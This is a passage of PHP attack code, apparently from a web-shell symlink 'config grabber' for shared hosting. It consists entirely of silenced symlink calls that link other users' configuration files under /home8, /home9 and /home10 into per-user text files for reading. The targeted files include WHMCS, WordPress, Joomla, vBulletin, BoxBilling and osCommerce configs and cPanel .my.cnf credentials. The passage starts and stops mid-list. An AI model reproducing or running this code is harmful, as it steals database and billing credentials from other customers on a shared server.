@symlink('/home8/'.$user.'/public_html/Whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/WHMC/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/Whmc/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/whmc/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/WHM/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/Whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/HOST/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/Host/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/host/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/SUPPORTES/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/Supportes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/supportes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/domains/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/domain/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/Hosting/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/HOSTING/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/hosting/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/CART/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/Cart/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/cart/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/ORDER/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/Order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/CLIENT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/Client/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/client/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/CLIENTAREA/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/Clientarea/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/clientarea/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/SUPPORT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/Support/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/support/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/BILLING/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/Billing/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/billing/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/BUY/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/Buy/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/buy/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/MANAGE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/Manage/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/manage/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/CLIENTSUPPORT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/ClientSupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/Clientsupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/clientsupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/CHECKOUT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/Checkout/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/checkout/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/BILLINGS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/Billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/BASKET/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/Basket/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/basket/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/SECURE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/Secure/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/secure/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/SALES/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/Sales/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/sales/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/BILL/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/Bill/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/bill/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/PURCHASE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/Purchase/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/purchase/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/ACCOUNT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/Account/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/account/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/USER/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/User/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/user/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/CLIENTS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/Clients/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/clients/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/BILLINGS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/Billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/MY/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/My/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/my/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/secure/whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/secure/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/panel/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/clientes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/cliente/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/support/order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home8/'.$user.'/public_html/boxbilling/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home8/'.$user.'/public_html/box/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home8/'.$user.'/public_html/host/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home8/'.$user.'/public_html/Host/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home8/'.$user.'/public_html/supportes/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home8/'.$user.'/public_html/support/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home8/'.$user.'/public_html/hosting/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home8/'.$user.'/public_html/cart/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home8/'.$user.'/public_html/order/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home8/'.$user.'/public_html/client/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home8/'.$user.'/public_html/clients/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home8/'.$user.'/public_html/cliente/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home8/'.$user.'/public_html/clientes/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home8/'.$user.'/public_html/billing/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home8/'.$user.'/public_html/billings/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home8/'.$user.'/public_html/my/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home8/'.$user.'/public_html/secure/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home8/'.$user.'/public_html/support/order/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home8/'.$user.'/public_html/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home8/'.$user.'/public_html/zencart/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home8/'.$user.'/public_html/products/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home8/'.$user.'/public_html/cart/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home8/'.$user.'/public_html/shop/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home8/'.$user.'/public_html/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home8/'.$user.'/public_html/hostbills/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home8/'.$user.'/public_html/host/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home8/'.$user.'/public_html/Host/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home8/'.$user.'/public_html/supportes/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home8/'.$user.'/public_html/support/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home8/'.$user.'/public_html/hosting/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home8/'.$user.'/public_html/cart/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home8/'.$user.'/public_html/order/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home8/'.$user.'/public_html/client/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home8/'.$user.'/public_html/clients/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home8/'.$user.'/public_html/cliente/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home8/'.$user.'/public_html/clientes/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home8/'.$user.'/public_html/billing/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home8/'.$user.'/public_html/billings/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home8/'.$user.'/public_html/my/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home8/'.$user.'/public_html/secure/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home8/'.$user.'/public_html/support/order/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home8/'.$user.'/.my.cnf',$user.'-Cpanel.txt');
@symlink('/home8/'.$user.'/public_html/po-content/config.php',$user.'-Popoji.txt');

//home 9 

@symlink('/home9/'.$user.'/public_html/vb/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home9/'.$user.'/public_html/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home9/'.$user.'/public_html/forum/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home9/'.$user.'/public_html/forums/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home9/'.$user.'/public_html/cc/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home9/'.$user.'/public_html/inc/config.php',$user.'-MyBB.txt');
@symlink('/home9/'.$user.'/public_html/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home9/'.$user.'/public_html/shop/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home9/'.$user.'/public_html/os/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home9/'.$user.'/public_html/oscom/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home9/'.$user.'/public_html/products/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home9/'.$user.'/public_html/cart/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home9/'.$user.'/public_html/inc/conf_global.php',$user.'-IPB.txt');
@symlink('/home9/'.$user.'/public_html/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home9/'.$user.'/public_html/wp/test/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home9/'.$user.'/public_html/blog/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home9/'.$user.'/public_html/beta/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home9/'.$user.'/public_html/portal/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home9/'.$user.'/public_html/site/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home9/'.$user.'/public_html/wp/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home9/'.$user.'/public_html/WP/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home9/'.$user.'/public_html/news/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home9/'.$user.'/public_html/wordpress/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home9/'.$user.'/public_html/test/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home9/'.$user.'/public_html/demo/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home9/'.$user.'/public_html/home/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home9/'.$user.'/public_html/v1/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home9/'.$user.'/public_html/v2/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home9/'.$user.'/public_html/press/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home9/'.$user.'/public_html/new/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home9/'.$user.'/public_html/blogs/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home9/'.$user.'/public_html/configuration.php',$user.'-Joomla.txt');
@symlink('/home9/'.$user.'/public_html/blog/configuration.php',$user.'-Joomla.txt');
@symlink('/home9/'.$user.'/public_html/submitticket.php',$user.'-^WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/cms/configuration.php',$user.'-Joomla.txt');
@symlink('/home9/'.$user.'/public_html/beta/configuration.php',$user.'-Joomla.txt');
@symlink('/home9/'.$user.'/public_html/portal/configuration.php',$user.'-Joomla.txt');
@symlink('/home9/'.$user.'/public_html/site/configuration.php',$user.'-Joomla.txt');
@symlink('/home9/'.$user.'/public_html/main/configuration.php',$user.'-Joomla.txt');
@symlink('/home9/'.$user.'/public_html/home/configuration.php',$user.'-Joomla.txt');
@symlink('/home9/'.$user.'/public_html/demo/configuration.php',$user.'-Joomla.txt');
@symlink('/home9/'.$user.'/public_html/test/configuration.php',$user.'-Joomla.txt');
@symlink('/home9/'.$user.'/public_html/v1/configuration.php',$user.'-Joomla.txt');
@symlink('/home9/'.$user.'/public_html/v2/configuration.php',$user.'-Joomla.txt');
@symlink('/home9/'.$user.'/public_html/joomla/configuration.php',$user.'-Joomla.txt');
@symlink('/home9/'.$user.'/public_html/new/configuration.php',$user.'-Joomla.txt');
@symlink('/home9/'.$user.'/public_html/WHMCS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/whmcs1/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/Whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/WHMC/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/Whmc/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/whmc/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/WHM/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/Whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/HOST/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/Host/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/host/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/SUPPORTES/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/Supportes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/supportes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/domains/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/domain/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/Hosting/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/HOSTING/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/hosting/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/CART/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/Cart/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/cart/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/ORDER/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/Order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/CLIENT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/Client/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/client/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/CLIENTAREA/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/Clientarea/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/clientarea/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/SUPPORT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/Support/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/support/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/BILLING/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/Billing/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/billing/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/BUY/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/Buy/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/buy/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/MANAGE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/Manage/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/manage/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/CLIENTSUPPORT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/ClientSupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/Clientsupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/clientsupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/CHECKOUT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/Checkout/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/checkout/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/BILLINGS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/Billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/BASKET/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/Basket/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/basket/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/SECURE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/Secure/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/secure/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/SALES/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/Sales/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/sales/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/BILL/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/Bill/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/bill/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/PURCHASE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/Purchase/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/purchase/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/ACCOUNT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/Account/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/account/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/USER/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/User/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/user/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/CLIENTS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/Clients/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/clients/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/BILLINGS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/Billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/MY/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/My/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/my/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/secure/whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/secure/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/panel/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/clientes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/cliente/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/support/order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home9/'.$user.'/public_html/boxbilling/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home9/'.$user.'/public_html/box/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home9/'.$user.'/public_html/host/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home9/'.$user.'/public_html/Host/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home9/'.$user.'/public_html/supportes/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home9/'.$user.'/public_html/support/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home9/'.$user.'/public_html/hosting/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home9/'.$user.'/public_html/cart/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home9/'.$user.'/public_html/order/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home9/'.$user.'/public_html/client/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home9/'.$user.'/public_html/clients/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home9/'.$user.'/public_html/cliente/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home9/'.$user.'/public_html/clientes/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home9/'.$user.'/public_html/billing/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home9/'.$user.'/public_html/billings/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home9/'.$user.'/public_html/my/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home9/'.$user.'/public_html/secure/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home9/'.$user.'/public_html/support/order/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home9/'.$user.'/public_html/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home9/'.$user.'/public_html/zencart/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home9/'.$user.'/public_html/products/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home9/'.$user.'/public_html/cart/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home9/'.$user.'/public_html/shop/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home9/'.$user.'/public_html/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home9/'.$user.'/public_html/hostbills/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home9/'.$user.'/public_html/host/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home9/'.$user.'/public_html/Host/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home9/'.$user.'/public_html/supportes/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home9/'.$user.'/public_html/support/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home9/'.$user.'/public_html/hosting/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home9/'.$user.'/public_html/cart/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home9/'.$user.'/public_html/order/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home9/'.$user.'/public_html/client/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home9/'.$user.'/public_html/clients/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home9/'.$user.'/public_html/cliente/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home9/'.$user.'/public_html/clientes/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home9/'.$user.'/public_html/billing/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home9/'.$user.'/public_html/billings/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home9/'.$user.'/public_html/my/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home9/'.$user.'/public_html/secure/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home9/'.$user.'/public_html/support/order/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home9/'.$user.'/.my.cnf',$user.'-Cpanel.txt');
@symlink('/home9/'.$user.'/public_html/po-content/config.php',$user.'-Popoji.txt');

//home 10

@symlink('/home10/'.$user.'/public_html/vb/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home10/'.$user.'/public_html/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home10/'.$user.'/public_html/forum/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home10/'.$user.'/public_html/forums/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home10/'.$user.'/public_html/cc/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home10/'.$user.'/public_html/inc/config.php',$user.'-MyBB.txt');
@symlink('/home10/'.$user.'/public_html/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home10/'.$user.'/public_html/shop/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home10/'.$user.'/public_html/os/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home10/'.$user.'/public_html/oscom/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home10/'.$user.'/public_html/products/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home10/'.$user.'/public_html/cart/includes/configure.php',$user.'-OsCommerce.txt');
